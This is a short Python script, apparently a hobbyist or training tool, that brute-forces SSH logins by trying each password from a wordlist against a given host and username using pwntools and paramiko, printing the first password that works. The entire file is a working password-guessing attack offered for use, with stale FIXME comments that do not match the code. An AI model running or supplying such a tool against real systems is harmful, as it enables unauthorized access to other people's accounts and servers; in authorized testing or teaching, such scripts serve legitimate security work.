#!/bin/python3

# ---------- SSH Bruteforce Tool 
# Intended for insecure systems (no PKA)
#
# Takes three arguments:
#  - IPv4 address of target host
#  - credential list for username
#  - wordlist for second half of credentials


# ---------- Imported modules
from pwn import *
import paramiko
import sys

#print("test of bfssh")

# ---------- Input Validation
if len(sys.argv) != 4:
    print("Invalid argument.")
    print(" >> {} <IPv4 Address> <Username> <path/to/wordlist>".format(sys.argv[0]))
    exit()

# target host IP address
#FIXME: convert this into a sys.argv[2]
host = sys.argv[1]
#host = "127.0.0.1"

# target credentials - username
#FIXME: convert into sys.argv[3] OR as an overloaded function
username = sys.argv[2]
#username = "notroot"

# wordlist used
#FIXME: add as sys.argv[4]
wordlist = sys.argv[3]

# used for keeping track of attempts
attempts = 0

# opening a file to read, and using loop to operate on contents
with open(wordlist, 'r') as password_list: #FIXME: replace with wordlist once active
    for password in password_list:
        # removing unneeded newlines from passwords
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'...".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            #returning a valid password
            if response.connected():
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password.")
        attempts += 1
